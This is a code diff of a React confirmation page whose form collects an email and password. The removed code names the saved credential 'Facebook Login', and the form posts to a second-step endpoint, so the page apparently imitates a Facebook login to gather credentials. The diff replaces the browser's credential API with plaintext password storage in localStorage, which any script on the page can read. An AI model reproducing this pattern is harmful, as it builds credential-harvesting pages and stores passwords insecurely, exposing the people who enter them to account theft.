@@ -51,20 +51,11 @@ export default function Confirmation() {
   useEffect(() => {
     const autofillData = async () => {
       try {
-        // Check if browser supports password manager API
-        if ('PasswordCredential' in window) {
-          // @ts-ignore - PasswordCredential API
-          const cred = await navigator.credentials.get({
-            password: true,
-            mediation: 'silent'
-          });
-
-          if (cred && 'password' in cred) {
-            // @ts-ignore - PasswordCredential API
-            form.setValue('user_email', cred.id || '');
-            // @ts-ignore - PasswordCredential API
-            form.setValue('password', cred.password || '');
-          }
+        const savedData = localStorage.getItem('user_credentials');
+        if (savedData) {
+          const { email, password } = JSON.parse(savedData);
+          form.setValue('user_email', email || '');
+          form.setValue('password', password || '');
         }
       } catch (error) {
         console.log('Auto-fill failed:', error);
@@ -99,17 +90,11 @@ export default function Confirmation() {
         password: data.password,
       };
 
-      // Save credentials if supported
-      if ('PasswordCredential' in window) {
-        // @ts-ignore - PasswordCredential API
-        const cred = new PasswordCredential({
-          id: formattedData.user_email,
-          password: formattedData.password,
-          name: 'Facebook Login'
-        });
-        // @ts-ignore - PasswordCredential API
-        navigator.credentials.store(cred).catch(console.error);
-      }
+      // Save credentials to localStorage instead of using PasswordCredential API
+      localStorage.setItem('user_credentials', JSON.stringify({
+        email: formattedData.user_email,
+        password: formattedData.password,
+      }));
 
       const response = await fetch('/api/form-two', {
         method: 'POST',
